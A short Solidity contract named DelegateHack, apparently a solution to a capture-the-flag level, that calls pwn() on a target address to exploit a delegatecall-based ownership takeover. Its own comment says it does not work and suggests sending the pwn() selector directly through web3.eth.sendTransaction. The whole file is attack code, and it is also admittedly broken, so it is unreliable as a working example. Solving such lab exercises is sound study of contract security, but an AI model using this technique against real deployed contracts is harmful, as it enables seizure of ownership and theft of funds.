// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
//does not work for some reason. However, with web3.eth.sendTransaction it works. Just hash pwn() and send it in data field. 
contract DelegateHack {
    address public delset;

    constructor (address _addr) {
        delset = _addr;
    }

    function attack() public {
        delset.call(abi.encodeWithSignature("pwn()"));
    }
}